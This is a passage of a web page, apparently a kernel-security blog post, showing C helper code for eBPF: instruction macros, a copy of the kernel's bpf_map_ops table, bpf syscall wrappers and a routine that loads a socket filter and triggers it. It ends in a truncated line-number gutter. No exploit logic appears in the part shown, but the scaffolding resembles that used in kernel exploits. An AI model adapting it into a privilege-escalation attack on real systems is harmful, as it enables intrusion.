BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_REG(OP, DST, SRC, OFF)                \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)                  \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)                \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()                                 \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* get a pointer to bpf_array */</span>                \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span></span><br><span class="line"><span class="meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* mov the result back and clear R0 */</span>          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __user</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __user </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __rcu</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __rcu </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf_type</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog_aux</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_table_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_local_storage_map</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* map is generic key/value storage optionally accesible by eBPF programs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> &#123;</span></span><br><span class="line">	<span class="comment">/* funcs callable from userspace (via syscall) */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_alloc_check)(<span class="keyword">union</span> bpf_attr *attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *(*<span class="title">map_alloc</span>)(<span class="title">union</span> <span class="title">bpf_attr</span> *<span class="title">attr</span>);</span></span><br><span class="line">	<span class="keyword">void</span> (*map_release)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file);</span><br><span class="line">	<span class="keyword">void</span> (*map_free)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line">	<span class="keyword">int</span> (*map_get_next_key)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *next_key);</span><br><span class="line">	<span class="keyword">void</span> (*map_release_uref)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line">	<span class="keyword">void</span> *(*map_lookup_elem_sys_only)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">	<span class="keyword">int</span> (*map_lookup_batch)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span><br><span class="line">				<span class="keyword">union</span> bpf_attr __user *uattr);</span><br><span class="line">	<span class="keyword">int</span> (*map_lookup_and_delete_batch)(struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">					   <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span><br><span class="line">					   <span class="keyword">union</span> bpf_attr __user *uattr);</span><br><span class="line">	<span class="keyword">int</span> (*map_update_batch)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span><br><span class="line">				<span class="keyword">union</span> bpf_attr __user *uattr);</span><br><span class="line">	<span class="keyword">int</span> (*map_delete_batch)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span><br><span class="line">				<span class="keyword">union</span> bpf_attr __user *uattr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* funcs callable from userspace and from eBPF programs */</span></span><br><span class="line">	<span class="keyword">void</span> *(*map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">	<span class="keyword">int</span> (*map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value, </span><br><span class="line">        		       <span class="keyword">uint64_t</span> flags);</span><br><span class="line">	<span class="keyword">int</span> (*map_delete_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">	<span class="keyword">int</span> (*map_push_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags);</span><br><span class="line">	<span class="keyword">int</span> (*map_pop_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line">	<span class="keyword">int</span> (*map_peek_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* funcs called by prog_array and perf_event_array map */</span></span><br><span class="line">	<span class="keyword">void</span> *(*map_fd_get_ptr)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file,</span><br><span class="line">				<span class="keyword">int</span> fd);</span><br><span class="line">	<span class="keyword">void</span> (*map_fd_put_ptr)(<span class="keyword">void</span> *ptr);</span><br><span class="line">	<span class="keyword">int</span> (*map_gen_lookup)(struct bpf_map *<span class="built_in">map</span>, struct bpf_insn *insn_buf);</span><br><span class="line">	<span class="keyword">uint32_t</span> (*map_fd_sys_lookup_elem)(<span class="keyword">void</span> *ptr);</span><br><span class="line">	<span class="keyword">void</span> (*map_seq_show_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span><br><span class="line">				  struct seq_file *m);</span><br><span class="line">	<span class="keyword">int</span> (*map_check_btf)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">			     <span class="keyword">const</span> struct btf *btf,</span><br><span class="line">			     <span class="keyword">const</span> struct btf_type *key_type,</span><br><span class="line">			     <span class="keyword">const</span> struct btf_type *value_type);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Prog poke tracking helpers. */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_poke_track)(struct bpf_map *<span class="built_in">map</span>, struct bpf_prog_aux *aux);</span><br><span class="line">	<span class="keyword">void</span> (*map_poke_untrack)(struct bpf_map *<span class="built_in">map</span>, struct bpf_prog_aux *aux);</span><br><span class="line">	<span class="keyword">void</span> (*map_poke_run)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">uint32_t</span> key, </span><br><span class="line">			     struct bpf_prog *old, struct bpf_prog *<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Direct value access helpers. */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_direct_value_addr)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">				     <span class="keyword">uint64_t</span> *imm, <span class="keyword">uint32_t</span> off);</span><br><span class="line">	<span class="keyword">int</span> (*map_direct_value_meta)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">				     <span class="keyword">uint64_t</span> imm, <span class="keyword">uint32_t</span> *off);</span><br><span class="line">	<span class="keyword">int</span> (*map_mmap)(struct bpf_map *<span class="built_in">map</span>, struct vm_area_struct *vma);</span><br><span class="line">	<span class="keyword">__poll_t</span> (*map_poll)(struct bpf_map *<span class="built_in">map</span>, struct file *filp,</span><br><span class="line">			     struct poll_table_struct *pts);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Functions called by bpf_local_storage maps */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_local_storage_charge)(struct bpf_local_storage_map *smap,</span><br><span class="line">					<span class="keyword">void</span> *owner, <span class="keyword">uint32_t</span> size);</span><br><span class="line">	<span class="keyword">void</span> (*map_local_storage_uncharge)(struct bpf_local_storage_map *smap,</span><br><span class="line">					   <span class="keyword">void</span> *owner, <span class="keyword">uint32_t</span> size);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_local_storage</span> __<span class="title">rcu</span> ** (*<span class="title">map_owner_storage_ptr</span>)(<span class="title">void</span> *<span class="title">owner</span>);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* map_meta_equal must be implemented for maps that can be</span></span><br><span class="line"><span class="comment">	 * used as an inner map.  It is a runtime check to ensure</span></span><br><span class="line"><span class="comment">	 * an inner map can be inserted to an outer map.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Some properties of the inner map has been used during the</span></span><br><span class="line"><span class="comment">	 * verification time.  When inserting an inner map at the runtime,</span></span><br><span class="line"><span class="comment">	 * map_meta_equal has to ensure the inserting map has the same</span></span><br><span class="line"><span class="comment">	 * properties that the verifier has used earlier.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*map_meta_equal)(<span class="keyword">const</span> struct bpf_map *meta0,</span><br><span class="line">			      <span class="keyword">const</span> struct bpf_map *meta1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* BTF name and id of struct allocated by map_alloc */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> map_btf_name;</span><br><span class="line">	<span class="keyword">int</span> *map_btf_id;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* bpf_iter info used to open a seq_file */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_iter_seq_info</span> *<span class="title">iter_seq_info</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="keyword">sizeof</span>(*attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_load_prog</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> prog_type, struct bpf_insn *insns, <span class="keyword">uint64_t</span> insn_cnt,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">char</span> *log_buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> log_buf_sz, <span class="keyword">unsigned</span> <span class="keyword">int</span> log_level)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = prog_type,</span><br><span class="line">        .insns = (<span class="keyword">uint64_t</span>) insns,</span><br><span class="line">        .insn_cnt = insn_cnt,</span><br><span class="line">        .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;GPL&quot;</span>,</span><br><span class="line">        .log_level = log_level,</span><br><span class="line">        .log_buf = (<span class="keyword">uint64_t</span>) log_buf,</span><br><span class="line">        .log_size = log_buf_sz,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_create</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> map_type, <span class="keyword">unsigned</span> <span class="keyword">int</span> key_size, </span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">unsigned</span> <span class="keyword">int</span> value_size, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_type = map_type,</span><br><span class="line">        .key_size = key_size,</span><br><span class="line">        .value_size = value_size,</span><br><span class="line">        .max_entries = max_entries,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_lookup_elem</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">const</span> <span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>) key,</span><br><span class="line">        .value = (<span class="keyword">uint64_t</span>) value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_update_elem</span><span class="params">(<span class="keyword">int</span> map_fd,<span class="keyword">const</span> <span class="keyword">void</span> *key,<span class="keyword">const</span> <span class="keyword">void</span> *value,<span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>) key,</span><br><span class="line">        .value = (<span class="keyword">uint64_t</span>) value,</span><br><span class="line">        .flags = flags,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_delete_elem</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">const</span> <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>) key,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">bpf_map_get_next_key</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">const</span> <span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd,</span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>) key,</span><br><span class="line">        .next_key = (<span class="keyword">uint64_t</span>) value,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LOG_BUF_SZ 0x100000</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> bpf_log_buf[BPF_LOG_BUF_SZ] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Run a bpf prog by attaching to a pair of sockets and sending packets</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param insns bpf program to be run</span></span><br><span class="line"><span class="comment"> * @param insn_cnt number of bpf instructions</span></span><br><span class="line"><span class="comment"> * @return int 0 for success, others for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insns, <span class="keyword">uint64_t</span> insn_cnt, <span class="keyword">unsigned</span> <span class="keyword">int</span> log_level, </span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">unsigned</span> <span class="keyword">int</span> print_log)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *err_msg = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> sock_fd[<span class="number">2</span>], prog_fd;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* socket pair to trigger eBPF prog */</span></span><br><span class="line">    ret = socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sock_fd);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_msg = <span class="string">&quot;FAILED to creat socket pair!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(bpf_log_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(bpf_log_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* load bpf prog into kernel */</span></span><br><span class="line">    prog_fd = bpf_load_prog(BPF_PROG_TYPE_SOCKET_FILTER, insns, insn_cnt, </span><br><span class="line">                            bpf_log_buf, BPF_LOG_BUF_SZ, log_level);</span><br><span class="line">    <span class="keyword">if</span> (prog_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ret = prog_fd;</span><br><span class="line">        err_msg = <span class="string">&quot;FAILED to load bpf program!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_bpf_load;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* attach bpf prog to a socket */</span></span><br><span class="line">    ret = setsockopt(sock_fd[<span class="number">0</span>],SOL_SOCKET,SO_ATTACH_BPF, &amp;prog_fd,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_msg = <span class="string">&quot;FAILED to attach the bpf program!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_bpf_attach;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* send a packet to trigger bpf */</span></span><br><span class="line">    write(sock_fd[<span class="number">1</span>], <span class="string">&quot;11111111&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* output the log */</span></span><br><span class="line">    <span class="keyword">if</span> (print_log != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(bpf_log_buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* recycle resource */</span></span><br><span class="line">    close(prog_fd);</span><br><span class="line">    close(sock_fd[<span class="number">1</span>]);</span><br><span class="line">    close(sock_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_bpf_attach:</span><br><span class="line">    close(prog_fd);</span><br><span class="line">err_bpf_load:</span><br><span class="line">    <span class="built_in">puts</span>(bpf_log_buf);</span><br><span class="line">    close(sock_fd[<span class="number">1</span>]);</span><br><span class="line">    close(sock_fd[<span class="number">0</span>]);</span><br><span class="line">err_socket:</span><br><span class="line">    err_print(err_msg);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span 